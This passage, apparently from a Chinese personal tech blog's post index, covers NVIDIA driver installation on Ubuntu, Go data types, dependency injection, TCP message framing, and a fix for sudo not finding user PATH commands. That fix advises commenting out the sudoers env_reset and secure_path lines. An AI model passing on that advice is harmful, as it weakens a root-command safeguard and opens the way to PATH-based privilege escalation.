不过这里还是简单说下步骤： 下载安装文件，增加可执行权限，打开英伟达官网，在驱动下载页面可以下载最新的Linux驱动。 屏蔽nouveau驱动，编辑 /etc/modprobe.d/blacklist.conf 文件，在文件末尾加入一行 blacklist nouveau，然后使用 sudo update-initramfs -u 更新内核文件，成功后重启！ 关闭x-server，在Ubuntu下面可以使用 service lightdm stop 命令 进入终端，执行安装文件，根据指示依次进行，这个脚本会做一些检测，如果检测到你没有屏蔽nouveau驱动会提示你，然后你可以选择自动创建，之后重启电脑，返回第3步 如果一切顺利的话，应该可以安装成功，但是往往没这么简单，比如会出现gcc版本不对的问题，还有一些第三方依赖问题，甚至卡死问题。所以，我这里并不建议大家自己手动安装！！！ 自动安装不同Linux发行版安装显卡驱动略有差异，有不少发行版都提供了一个比较简单的安装方式，比如Ubuntu在附加驱动里面就可以安装驱动。 在附加驱动里面我们可以选择需要安装的驱动，在这里列出的基本上都不会有问题，安装完成之后重启即可，默认情况下会自动启用独显！英伟达的显卡会有一个驱动设置面板，可以做一些简单设置。 常见问题正常情况下，安装显卡驱动还是非常简单的，特别是在Ubuntu下面，鼠标点点就行了，然而现实往往没有这么简单，可能会遇到很多意外，下面我就说说常见的问题： 1.卡登录安装完显卡驱动之后，登录的时候输入密码点击确认之后会返回登录页面，无法进入桌面，循环登录，也就是卡登录，通常这情况都是由于驱动不兼容或者设置不正确导致。 不过不要慌，卸载掉驱动就行了，虽然无法进入图形桌面，我们可以使用 Alt+F1-F5进入命令行，然后登录后，使用命令行下载NVIDIA驱动，sudo apt purge nvidia* 卸载掉驱动后，重启就可以进入桌面了，然后可以尝试安装其它版本的驱动。 2.卡死机表现就是在安装驱动的过程中，卡在哪里，鼠标键盘无响应，这种情况下基本上是内核卡死了，你等多久都没用。 一般是因为主板某些设置，比如安全启动，建议关闭安全启动，也就是secure boot 还有可能是因为内存原因，我之前就是因为主板上面插了4根8G内存条，但是有2根是2400MHz，有2根是2666MHz，基频不一致。 还有比如说CPU超频了，经过我测试，Linux对CPU超频的兼容性不好，如果超频可能会导致死机，不建议大幅度超频！","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://wangbjun.github.io/tags/Ubuntu/"}]},{"title":"Golang的常用数据结构","slug":"golang-datastruct","date":"2019-06-19T13:00:33.000Z","updated":"2020-01-09T08:09:53.228Z","comments":true,"path":"2019/06/19/golang-datastruct/","link":"","permalink":"https://wangbjun.github.io/2019/06/19/golang-datastruct/","excerpt":"闲着无事，随便写写，初学Go，望各位大神轻喷！Go自带的几个复合数据类型，基本数据类型咱就不说了，大部分语言常见的几种复合数据类型大概有数组、字典、对象等，不同语言叫法不一样，用法也有差异，比如说PHP里面数组其实严格来说不算数组。","text":"闲着无事，随便写写，初学Go，望各位大神轻喷！Go自带的几个复合数据类型，基本数据类型咱就不说了，大部分语言常见的几种复合数据类型大概有数组、字典、对象等，不同语言叫法不一样，用法也有差异，比如说PHP里面数组其实严格来说不算数组。 1.数组Go里面的数组和C类似，是由有序的固定长度的特定类型元素组成。画重点，固定长度和特定类型。在很多弱类型的语言里面，数组非常随意，PHP的数组本质上是一个hash table，和C的数组差异太大，所以写惯了PHP再写Go的话这点需要注意。 基础用法1:12345678910111213141516171819202122package mainimport &quot;fmt&quot;func main() &#123; var a [5]int a[1] &#x3D; 1 a[2] &#x3D; 3 var b [10]string b[0] &#x3D; &quot;a1&quot; b[1] &#x3D; &quot;b2&quot; b[2] &#x3D; &quot;c5&quot; fmt.Printf(&quot;%v\\n&quot;, a) fmt.Printf(&quot;%v\\n&quot;, b)&#125;---结果---[0 1 3 0 0][a1 b2 c5 ] 从语法上看，Go定义数组的类型放在后面，这点写惯C系语言的估计蛋疼。数组也是通过索引下标访问，如果不初始化赋值的话，默认情况下，int类型的元素是0,string类型是空字符串。 基础用法2我们也可以不先定义，直接使用字面量初始化数组： 1234567891011package mainimport &quot;fmt&quot;func main() &#123; a :&#x3D; [...]int&#123;1, 2, 3, 4, 5, 7&#125; fmt.Printf(&quot;%v&quot;, a)&#125;---结果---[1 2 3 4 5 7] 在这种情况下，我们可以省略长度,使用3个点代替，编译器会自动判断。 数组遍历主要有两种方式： 123456789101112131415package mainimport &quot;fmt&quot;func main() &#123; a :&#x3D; [...]int&#123;1, 2, 3, 4, 5, 7&#125; for i :&#x3D; 0; i &lt; len(a); i++ &#123; fmt.Print(a[i]) &#125; for k, v :&#x3D; range a &#123; fmt.Print(k, &quot;-&gt;&quot;, v) &#125;&#125; 如果知道长度的话可以使用for循环，否则可以使用for range 这种语法。 数组函数Go内置了一些函数可以操作数组，如果你使用了IDE的话，可以“点”出来： 然而，append并不是用来操作数组的，其实它是用来操作变长数组的，即slice, 又称切片。 2.Slice（切片）传统的数组长度固定，所以实际用途并不多，除非你明确知道自己想要多长的数组，很多时候我们需要的是一个可以改变长度大小的数组，在Go里面这类型被称为切片。 slice其实是从数组而来的，它和数组非常像，区别就在于slice没有固定长度，非常方便，所以平时一般都是用这个比较多。 基础用法1:1234567891011121314package mainimport &quot;fmt&quot;func main() &#123; var a []int a &#x3D; append(a, 2) a &#x3D; append(a, 1) a &#x3D; append(a, 4) a &#x3D; append(a, 5) fmt.Printf(&quot;%v&quot;, a)&#125; 区别就在于slice在定义的时候不需要指定长度，也不用3个点，但是这就意味着你不能使用索引下标的方法去赋值了，可以使用append函数去追加元素。 而且在使用slice的也需要注意下标，如果大于slice的长度也会出现 panic: runtime error: index out of range。 基础用法2123456789101112131415161718package mainimport &quot;fmt&quot;func main() &#123; a :&#x3D; [...]int&#123;1,2,3,4,5,6,7,8&#125; s1 :&#x3D; a[0:] s2 :&#x3D; a[1:5] s3 :&#x3D; a[4:6] fmt.Printf(&quot;%v\\n&quot;, a) fmt.Printf(&quot;%v\\n&quot;, s1) fmt.Printf(&quot;%v\\n&quot;, s2) fmt.Printf(&quot;%v\\n&quot;, s3)&#125; slice可以使用[start:end]这种语法从一个数组里面生成，比如a[1:5]意思是生成一个包含数组索引1到5的之间元素的slice。 在Go里面不同长度但是同一类型的数组是不同类型的，比如你定义了2个int数组，一个长度为5，一个长度为10，他们其实并不是同一个类型，虽然都是int类型。cannot use a (type [10]int) as type [5]int in argument 所以在大部分时候我们需要的是一个slice，并不是一个数组。虽然这个2个用法基本上一毛一样。。。 3.Map在很多语言里面，map被叫作字典，这个中文名称很亲切，字典就是一种key value结构，小时候大家都用过新华字典，字典的特征就是每一个字都对应一个解释。但是Go的map是无序的，这点大家需要注意。如果有童鞋写过PHP，会发现这个数据类型类似PHP里面的关联数组。 在Go里面，它和slice的区别就是slice的索引是数值，map的索引类型就丰富了，基本上常用数据类型都支持，甚至包括结构体。 基础用法和其它数组类型一样，map也支持先定义后赋值，或者直接使用字面量创建。但是如果使用先定义后赋值这种方式，map需要使用make初始化。 1234567891011121314151617181920212223package mainimport &quot;fmt&quot;func main() &#123; var m1 map[string]string m1 &#x3D; make(map[string]string) m1[&quot;name&quot;] &#x3D; &quot;Golang&quot; m1[&quot;address&quot;] &#x3D; &quot;BeiJin&quot; m2 :&#x3D; map[string]string&#123; &quot;name&quot;: &quot;GoLand&quot;, &quot;addr&quot;: &quot;ShangHai&quot;, &#125; fmt.Printf(&quot;%v\\n&quot;, m1) fmt.Printf(&quot;%v&quot;, m2)&#125;---结果---map[name:Golang address:BeiJin]map[name:GoLand addr:ShangHai] map可以使用for range 语法遍历，但是需要注意的是每次遍历的顺序是无序的。 如何判断一个key是否存在map里面？在PHP里面我们有一个array_key_exists函数，在Go里面写法略有不同： 1234age, ok :&#x3D; m1[&quot;age&quot;]if !ok &#123; fmt.Println(&quot;age 不存在&quot;, age)&#125; 其实如果你不判断是否存在直接取也可以，并不会报错，只不过获取到的值是一个对应类型的零值。 4.结构体Go的结构体也类似C，类似于现在很多面向对象的语言里面的类，往往用来存储一组相关联的数据，Go虽然不是一个完全面向对象的语言，但是使用结构体可以实现类似效果。 基本用法1234567891011121314151617181920212223242526272829303132package mainimport &quot;fmt&quot;type Goods struct &#123; name string price int pic string address string&#125;func main() &#123; var goods Goods goods.name &#x3D; &quot;商品1&quot; goods.price &#x3D; 100 goods.pic &#x3D; &quot;http:&#x2F;&#x2F;xxxx.jpg&quot; goods.address &#x3D; &quot;中国&quot; fmt.Printf(&quot;%v\\n&quot;, goods) goods2 :&#x3D; Goods&#123; name: &quot;商品2&quot;, price: 200, pic: &quot;http:&#x2F;&#x2F;xxxx.png&quot;, address: &quot;日本&quot;, &#125; fmt.Printf(&quot;%v&quot;, goods2)&#125;---结果---&#123;商品1 100 http:&#x2F;&#x2F;xxxx.jpg 中国&#125;&#123;商品2 200 http:&#x2F;&#x2F;xxxx.png 日本&#125; 先定义后赋值或者字面量赋值都可以，值得一提的是在Go里面如果结构体或者其属性的首字母大写则表示该结构体或者属性可以被导出，也就是被其它包使用。结构体里面的属性成员的类型也可以是结构体，这就变相实现了类的继承。 既然结构体和类差不多，那类的方法在哪里定义呢？这点Go实现的就比较巧妙了！ 123func (g Goods) getName() string &#123; return g.name&#125; 我们只需要在函数的前面放一个变量，就变成了方法。在很多语言里面，函数和方法区分不是很明显，大部分时候我们都是混着叫，但是在Go里面，方法指的是针对某一类型的函数。比如在上面的例子里面，这个getName函数就是针对Goods结构体的,用面向对象的说法就是一个类方法。所以我们可以使用 goods.getName()的形式调用这个方法。 上面的代码里那个附加的参数p，叫做方法的接收器（receiver），早期的面向对象语言留下的遗产将调用一个方法称为“向一个对象发送消息”。 在Go语言中，我们并不会像其它语言那样用this或者self作为接收器；我们可以任意的选择接收器的名字。由于接收器的名字经常会被使用到，所以保持其在方法间传递时的一致性和简短性是不错的主意。这里的建议是可以使用其类型的第一个字母。 在Go里面我们可以为任何类型定义方法，无论是常见的int、string，还是map、struct都没问题，下面的例子里面就是为int类型扩展一个方法： 123456789101112131415161718package mainimport &quot;fmt&quot;type MyInt intfunc main() &#123; myInt :&#x3D; MyInt(10) res :&#x3D; myInt.add(100) fmt.Printf(&quot;%d&quot;, res)&#125;func (m MyInt) add(a int) int &#123; return int(m) + a&#125;---结果---110 我们无法直接使用基本数据类型，但是我们可以起一个别名，纯属娱乐！ 5.JSON严格来说，JSON并不是一种数据类型，但是json是现在最流行的数据交换格式，Go对json的支持也很好，在Go里面主要通过结构体生成json，我们也可以把一个json转换成结构体。 1234567891011121314151617181920212223242526272829package mainimport ( &quot;encoding&#x2F;json&quot; &quot;fmt&quot;)type Goods struct &#123; Name string Price int Address string &#96;json:&quot;address2&quot;&#96; Tag string&#125;func main() &#123; goods :&#x3D; Goods&#123; &quot;商品1&quot;, 100, &quot;中国&quot;, &quot;特价&quot;, &#125; bytes, err :&#x3D; json.Marshal(goods) if err !&#x3D; nil &#123; panic(err) &#125; fmt.Printf(&quot;%s&quot;, bytes)&#125;---结果---&#123;&quot;Name&quot;:&quot;商品1&quot;,&quot;Price&quot;:100,&quot;address2&quot;:&quot;中国&quot;,&quot;Tag&quot;:&quot;特价&quot;&#125; 把结构体转换成json可以使用Marshal方法，有一点需要注意: 结构体的属性成员首字母必须大写，但是可以使用注解的Tag标注转换成json之后的key名称。 json字符串转换成结构体步骤差不多： 12345678910111213141516171819202122232425262728package mainimport ( &quot;encoding&#x2F;json&quot; &quot;fmt&quot;)type Goods struct &#123; Name string Price int Address string &#96;json:&quot;address2&quot;&#96; Tag string&#125;func main() &#123; jsonStr :&#x3D; &#96;&#123;&quot;Name&quot;:&quot;商品1&quot;,&quot;Price&quot;:100,&quot;address2&quot;:&quot;中国&quot;,&quot;Tag&quot;:&quot;特价&quot;&#125;&#96; goods :&#x3D; Goods&#123;&#125; err :&#x3D; json.Unmarshal([]byte(jsonStr), &amp;goods) if err !&#x3D; nil &#123; panic(err) &#125; fmt.Printf(&quot;%v&quot;, goods)&#125;---结果---&#123;商品1 100 特价&#125; 这在我们平时写接口或者请求接口的时候非常好使，简单易用！ 好了，今天就介绍这么多了，谢谢！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"解决sudo command not found 报错","slug":"sudo-command-not-found","date":"2019-06-02T03:29:06.000Z","updated":"2020-01-08T17:18:05.749Z","comments":true,"path":"2019/06/02/sudo-command-not-found/","link":"","permalink":"https://wangbjun.github.io/2019/06/02/sudo-command-not-found/","excerpt":"偶尔发现的一个问题，平时主要使用 Ubuntu 操作系统，有时候安装一些软件会用加一些自定义PATH，往往为了方便都会把配置写到 /etc/environment 里面,这样所有用户包括root都有效： 1234jwang@jwang:~$ cat &#x2F;etc&#x2F;environment PATH&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;home&#x2F;jwang&#x2F;MyBin:&#x2F;opt&#x2F;go&#x2F;bin&quot;export GOPATH&#x3D;&#x2F;home&#x2F;jwang&#x2F;Go","text":"偶尔发现的一个问题，平时主要使用 Ubuntu 操作系统，有时候安装一些软件会用加一些自定义PATH，往往为了方便都会把配置写到 /etc/environment 里面,这样所有用户包括root都有效： 1234jwang@jwang:~$ cat &#x2F;etc&#x2F;environment PATH&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;home&#x2F;jwang&#x2F;MyBin:&#x2F;opt&#x2F;go&#x2F;bin&quot;export GOPATH&#x3D;&#x2F;home&#x2F;jwang&#x2F;Go 比如说安装了go，在使用 sudo go 这样命令的时候会报错，但是切换到 root 用户却没有问题，使用普通用户也没问题，查了一下发现原来 sudo 里面有一些配置： 1sudo visudo 在这个 /etc/sudoers 文件里面，有一个secure_path配置，大家一看就知道了，它的意思当你使用 sudo+command 这种形式执行命令的时候会从其配置的路径里面寻找命令，肯定是没有你自定义的PATH的，这个主要是安全考虑。 解决方法有几种： 直接把自定义PATH路径配置在secure_path里面，简单粗暴，就是有点麻烦 将 Defaults env_reset 改成 Defaults !env_reset 取消掉对PATH变量的重置，然后在.bashrc中最后添加alias sudo=’sudo env PATH=$PATH’，这个感觉更麻烦 直接把这3行注释掉，经测试完全没有任何问题 我是采用第3种方式解决的，非常好用，暂时未发现问题！","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Sudo","slug":"Sudo","permalink":"https://wangbjun.github.io/tags/Sudo/"}]},{"title":"Golang的依赖注入简介","slug":"golang-di","date":"2019-05-15T13:13:49.000Z","updated":"2020-01-08T17:37:43.313Z","comments":true,"path":"2019/05/15/golang-di/","link":"","permalink":"https://wangbjun.github.io/2019/05/15/golang-di/","excerpt":"DI - Dependency Injection，即“依赖注入”，是指组件之间依赖关系由容器在运行期决定，与此同时还有一个叫作IOC的词汇，IOC即控制反转。 理论上讲，这2个概念都是基于OOP编程而产生的思想，在OOP编程里面，我们强调对象之间的依赖关系，比如说对象B依赖对象A的某些功能，我们就说B依赖A。 DI毕竟不是Go语言的专利，它是一种编程思想，在很多语言里面都有体现和实现，相信很多具有编程经验的人也有所了解，下面咱们直接开始讲在Go语言里面怎么使用DI。","text":"DI - Dependency Injection，即“依赖注入”，是指组件之间依赖关系由容器在运行期决定，与此同时还有一个叫作IOC的词汇，IOC即控制反转。 理论上讲，这2个概念都是基于OOP编程而产生的思想，在OOP编程里面，我们强调对象之间的依赖关系，比如说对象B依赖对象A的某些功能，我们就说B依赖A。 DI毕竟不是Go语言的专利，它是一种编程思想，在很多语言里面都有体现和实现，相信很多具有编程经验的人也有所了解，下面咱们直接开始讲在Go语言里面怎么使用DI。 实现方式Golang的DI目前主要有2种方式，一种是使用反射特性实现，代表开源项目有facebook/inject，还有uber/dig。另一种是代码自动生成，代表开源项目有google/wire。 下面咱们看一个案例： 由于Go并不是纯OOP语言，所以这里使用struct模拟对象的概念，有3个对象，其中App依赖DB和Redis。 DB： 1234567891011package Objectimport \"fmt\"type DB struct &#123; config string&#125;func (DB) Get() &#123; fmt.Println(\"I am DB\")&#125; Redis： 123456789package Objectimport \"fmt\"type Redis struct&#123;&#125;func (Redis) Get() &#123; fmt.Println(\"I am Redis\")&#125; App: 1234567891011121314package Objectimport \"fmt\"type App struct &#123; r Redis db DB&#125;func (p App) Work() &#123; fmt.Println(\"I can work\") p.db.Get() p.r.Get()&#125; 如果不使用依赖注入，我们只能手动解决依赖，代码如下： 1234567891011package mainimport \"di/Object\"func main() &#123; app := Object.App&#123; R: Object.Redis&#123;&#125;, DB: Object.DB&#123;&#125;, &#125; app.Work()&#125; 这种写法并无太大问题，简单安全，不过项目非常大的时候，对象之间依赖关系复杂，手动解决依赖可能非常麻烦，这时候就需要自动注入依赖了。 facebook/inject这是Facebook开源的一个项目，地址：github.com/facebookgo/inject 它使用struct的tag声明依赖，第一个无值语法是针对关联类型的单例依赖的常见情况。第二个触发器创建关联类型的私有实例。最后一个是要求一个名为 “dev logger” 的依赖关系。 123&#96;inject:&quot;&quot;&#96;&#96;inject:&quot;private&quot;&#96;&#96;inject:&quot;dev logger&quot;&#96; 下面以App为例： 1234type App struct &#123; R Redis `inject:\"\"` DB DB `inject:\"\"`&#125; 运行： 12345678910111213141516171819202122package mainimport ( \"di/Object\" \"github.com/facebookgo/inject\")func main() &#123; var g inject.Graph var app Object.App _ = g.Provide( &amp;inject.Object&#123;Value: &amp;Object.DB&#123;&#125;,&#125;, &amp;inject.Object&#123;Value: &amp;Object.Redis&#123;&#125;,&#125;, &amp;inject.Object&#123;Value: &amp;app, &#125;) _ = g.Populate() app.Work()&#125; 给struct tag只是第一步，在程序启动的时候需要先注入依赖。 性能问题一般说到依赖注入必然会用到反射，说到Go的反射，大多数人都会说性能很差。 这个inject库也是用到了反射原理，性能会不会很差呢？ 其实还是看用法，官方推荐在应用程序启动的时候注入所有依赖，而不是在运行中注入依赖，这样即使慢，也只是程序每次启动的时候慢，并不影响后续的运行情况。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"Golang处理TCP“粘包”问题","slug":"golang-tcp-package","date":"2019-05-10T04:05:45.000Z","updated":"2020-01-08T09:54:02.670Z","comments":true,"path":"2019/05/10/golang-tcp-package/","link":"","permalink":"https://wangbjun.github.io/2019/05/10/golang-tcp-package/","excerpt":"1.什么是粘包？“粘包”这个说法已经被诟病很久了，既然坊间流传这个说法咱们就沿用吧，关于这个问题比较准确的解释可以参考下面几点： TCP是流传输协议,是一种面向连接的、可靠的、基于字节流的传输层通信协议 TCP没有包的概念，它只负责传输字节序列，UDP是面向数据报的协议，所以不存在拆包粘包问题 应该由应用层来维护消息和消息的边界，即需要一个应用层协议，比如HTTP 所以，本质上这是一个没有正确使用TCP协议的而产生的问题，有网友说了一句非常形象的话：“打开家里的水龙头， 看着自来水往下流， 然后你告诉我， 看， 自来水粘在一起了， 不是有病？”","text":"1.什么是粘包？“粘包”这个说法已经被诟病很久了，既然坊间流传这个说法咱们就沿用吧，关于这个问题比较准确的解释可以参考下面几点： TCP是流传输协议,是一种面向连接的、可靠的、基于字节流的传输层通信协议 TCP没有包的概念，它只负责传输字节序列，UDP是面向数据报的协议，所以不存在拆包粘包问题 应该由应用层来维护消息和消息的边界，即需要一个应用层协议，比如HTTP 所以，本质上这是一个没有正确使用TCP协议的而产生的问题，有网友说了一句非常形象的话：“打开家里的水龙头， 看着自来水往下流， 然后你告诉我， 看， 自来水粘在一起了， 不是有病？” 2.如何解决粘包？通常来说，一般有下面几种方式： 消息长度固定，提前确定包长度，读取的时候也安固定长度读取，适合定长消息包。 使用特殊的字符或字符串作为消息的边界，例如 HTTP 协议的 headers 以“\\r\\n”为字段的分隔符 自定义协议，将消息分为消息头和消息体，消息头中包含表示消息总长度 3.Golang实战首先，来看一个存在粘包问题的例子： 一、Server端：12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( \"log\" \"net\" \"strings\")func main() &#123; listen, err := net.Listen(\"tcp\", \"127.0.0.1:8888\") if err != nil &#123; panic(err) &#125; defer listen.Close() for &#123; conn, err := listen.Accept() if err != nil &#123; panic(err) &#125; for &#123; data := make([]byte, 10) _, err := conn.Read(data) if err != nil &#123; log.Printf(\"%s\\n\", err.Error()) break &#125; receive := string(data) log.Printf(\"receive msg: %s\\n\", receive) send := []byte(strings.ToUpper(receive)) _, err = conn.Write(send) if err != nil &#123; log.Printf(\"send msg failed, error: %s\\n\", err.Error()) &#125; log.Printf(\"send msg: %s\\n\", receive) &#125; &#125;&#125; 简单说一下这段代码，有点socket编程的基础的话应该很容易理解，基本上都是Listen -&gt; Accept -&gt; Read这个套路。 有些人一下子就看出来这个服务有点“问题”，它是同步阻塞的，也就意味着这个服务同一时间只能处理一个连接请求，其实解决这个问题也很简单，得益于Go协程的强大，我们只需要开启一个协程单独处理每一个连接就行了。不过这不是今天的主题，有兴趣的童鞋可以自行研究。 二、Client端：这个服务的功能特别简单，客户端输入什么我就返回什么，客户端的话，这里我使用telnet来演示： script12345678jwang@jwang:~$ telnet 127.0.0.1 8888Trying 127.0.0.1...Connected to 127.0.0.1.Escape character is '^]'.111111111111123456123456 当你按回车键的时候telnet会在消息后面自动追加”\\r\\n“换行符并发送消息！ 从代码里面可以看到，在接受消息的时候我们每次读取10个字节的内容输出并返回，如果输入的消息小于等于8（减去换行符）个字符的时候没有问题，但是当我们在telnet里面输入大于10个字符的内容的时候，这些数据的时候会被强行拆开处理。 当然这里有人说了，可不可以一次读多点，然而读多少都会存在这个问题，而且TCP会有缓存区，不一定能够及时把消息发出去，像Nagle优化算法会将多次间隔较小、数据量小的数据，合并成一个大的数据块，然后进行封包，还是会存在问题。 如果我们把这个内容看作是一个业务消息，这个业务消息就被拆分放到下个消息里面处理，必然会产生问题，这就是“粘包”问题的由来。说到底，还是用的人的问题，没有确定好数据边界，如果简单粗暴的读取固定长度的内容，必然会出现问题。 4.边界符解决粘包问题前面说过这个问题，我们可以通过定义一个边界符号解决粘包问题，比如说在上面的例子里面telnet会自动在每一条消息后面追加“\\r\\n”符号，我们恰好可以利用这点来区分消息。 定义一个buffer来临时存放消息 从conn里面读取固定字节大小内容，判断当前内容里面有没有分隔符 如果没有找到分隔符，把当前内容追加到buffer里面，然后重复第2步 如果找到分隔符，把当前内容里面分隔符之前的内容追加到buffer后输出 然后重置buffer，把分隔符之后的内容追加到buff，重复第2步 不过Go里面提供了一个非常好用的buffer库，为我们节省了很多操作 我们可以使用bufio库里面的NewReader把conn包装一下，然后使用ReadSlice方法读取内容，该方法会一直读直到遇到分隔符，非常简单实用。 一、Server端：123456789101112131415161718192021222324252627282930package mainimport ( \"bufio\" \"fmt\" \"net\")func main() &#123; listen, err := net.Listen(\"tcp\", \"127.0.0.1:8888\") if err != nil &#123; panic(err) &#125; defer listen.Close() for &#123; conn, err := listen.Accept() if err != nil &#123; panic(err) &#125; reader := bufio.NewReader(conn) for &#123; slice, err := reader.ReadSlice('\\n') if err != nil &#123; continue &#125; fmt.Printf(\"%s\", slice) &#125; &#125;&#125; 二、Client端：Client这里可以直接使用telnet，也可以自己写一个，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( \"log\" \"net\" \"strconv\" \"testing\" \"time\")func Test(t *testing.T) &#123; conn, err := net.Dial(\"tcp\", \"127.0.0.1:8888\") if err != nil &#123; log.Println(\"dial error:\", err) return &#125; defer conn.Close() i := 0 for &#123; var err error _, err = conn.Write([]byte(strconv.Itoa(i) + \" =&gt; 77777\\n\")) _, err = conn.Write([]byte(strconv.Itoa(i) + \" =&gt; 88888\\n\")) _, err = conn.Write([]byte(strconv.Itoa(i) + \" =&gt; 555555555555555555555555555555555555555555\\n\")) if err != nil &#123; panic(err) &#125; time.Sleep(time.Second * 1) _, err = conn.Write([]byte(strconv.Itoa(i) + \" =&gt; 123456\\n\")) _, err = conn.Write([]byte(strconv.Itoa(i) + \" =&gt; 123456\\n\")) if err != nil &#123; panic(err) &#125; time.Sleep(time.Second * 1) _, err = conn.Write([]byte(strconv.Itoa(i) + \" =&gt; 9999999\\n\")) _, err = conn.Write([]byte(strconv.Itoa(i) + \" =&gt; 0000000000000000000000000000000000000000000\\n\")) if err != nil &#123; panic(err) &#125; i++ &#125;&#125; 如果要说缺点，这种方式主要存在2点，第一点是分隔符的选择问题，如果需要传输的消息包含分隔符，那就需要提前做转义处理。第二点就是性能问题，如果消息体特别大，每次查找分隔符的位置的话肯定会有一点消耗。 5.在头部放入信息长度目前应用最广泛的是在消息的头部添加数据包长度，接收方根据消息长度进行接收；在一条TCP连接上，数据的流式传输在接收缓冲区里是有序的，其主要的问题就是第一个包的包尾与第二个包的包头共存接收缓冲区，所以根据长度读取是十分合适的。 一、Server端：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package mainimport ( \"bufio\" \"bytes\" \"encoding/binary\" \"fmt\" \"net\")func main() &#123; listen, err := net.Listen(\"tcp\", \"127.0.0.1:8888\") if err != nil &#123; panic(err) &#125; defer listen.Close() for &#123; conn, err := listen.Accept() if err != nil &#123; panic(err) &#125; reader := bufio.NewReader(conn) for &#123; //前4个字节表示数据长度 peek, err := reader.Peek(4) if err != nil &#123; continue &#125; buffer := bytes.NewBuffer(peek) //读取数据长度 var length int32 err = binary.Read(buffer, binary.BigEndian, &amp;length) if err != nil &#123; continue &#125; //Buffered 返回缓存中未读取的数据的长度,如果缓存区的数据小于总长度，则意味着数据不完整 if int32(reader.Buffered()) &lt; length+4 &#123; continue &#125; //从缓存区读取大小为数据长度的数据 data := make([]byte, length+4) _, err = reader.Read(data) if err != nil &#123; continue &#125; fmt.Printf(\"receive data: %s\\n\", data[4:]) &#125; &#125;&#125; 二、Client端：需要注意的是发送数据的编码，这里使用了Go的binary库，先写入4个字节的头，再写入消息主体，最后一起发送过去。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package mainimport ( \"bytes\" \"encoding/binary\" \"fmt\" \"log\" \"net\" \"testing\" \"time\")func Test(t *testing.T) &#123; conn, err := net.Dial(\"tcp\", \"127.0.0.1:8888\") if err != nil &#123; log.Println(\"dial error:\", err) return &#125; defer conn.Close() for &#123; data, _ := Encode(\"123456789\") _, err := conn.Write(data) data, _ = Encode(\"888888888\") _, err = conn.Write(data) time.Sleep(time.Second * 1) data, _ = Encode(\"777777777\") _, err = conn.Write(data) data, _ = Encode(\"123456789\") _, err = conn.Write(data) time.Sleep(time.Second * 1) fmt.Println(err) &#125;&#125;func Encode(message string) ([]byte, error) &#123; // 读取消息的长度 var length = int32(len(message)) var pkg = new(bytes.Buffer) // 写入消息头 err := binary.Write(pkg, binary.BigEndian, length) if err != nil &#123; return nil, err &#125; // 写入消息实体 err = binary.Write(pkg, binary.BigEndian, []byte(message)) if err != nil &#123; return nil, err &#125; return pkg.Bytes(), nil&#125; 6.总结世界上本没有“粘包”，只不过是少数人没有正确处理TCP数据边界问题，成熟的应用层协议（http、ssh）都不会存在这个问题。但是如果你使用纯TCP自定义协议，那就需要自己处理好了。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"Ubuntu 4K显示器缩放设置","slug":"ubuntu-4k-scale","date":"2019-05-03T04:21:06.000Z","updated":"2020-01-09T04:55:13.604Z","comments":true,"path":"2019/05/03/ubuntu-4k-scale/","link":"","permalink":"https://wangbjun.github.io/2019/05/03/ubuntu-4k-scale/","excerpt":"开头一张图介绍一下我现在日常生活和开发使用的电脑配置：Ubuntu 16.04 + i7-8700k + 1060 + nvme ssd + 32G RAM + 4k显示器，这个配置倒不算很高端，但是开发用体验很高，系统的流畅程度非常高","text":"开头一张图介绍一下我现在日常生活和开发使用的电脑配置：Ubuntu 16.04 + i7-8700k + 1060 + nvme ssd + 32G RAM + 4k显示器，这个配置倒不算很高端，但是开发用体验很高，系统的流畅程度非常高 电脑CPU和内存可以差点，ssd是必须有的，另外还有一个亮点是LG的4k显示器，这个体验非常棒，现在4k显示器非常便宜，我这个也就2k左右的价格。 今天的主题就是4k显示器，众所周知，Mac的显示效果之所以出众是由于其高超的屏幕分辨率，几年前Mac都已经用上了3k分辨率，而且大多数Windows笔记本还用着1080p，苹果的IMac早已经用上了5k显示器。 换句话说，买Mac买的就是显示屏，没有屏幕的硬件加持，什么操作系统优化都是扯淡！有了4k显示器，你发现装上Windows显示效果也不差，不过这块我需要说一下，同等硬件下，Linux和Mac的显示效果确实要比Windows好一点，对高分屏的支持好很多。 版本我个人比较喜欢unity桌面，所以还是用Ubuntu 16.04，我曾经尝试过Ubuntu 18.04，但是感觉gnome桌面在流畅度和易用性方面和unity还是有不少差距，所以本篇文章可能支持适合unity桌面吧 硬件如果你要换4k显示屏，有一点需要注意，不少i7 CPU 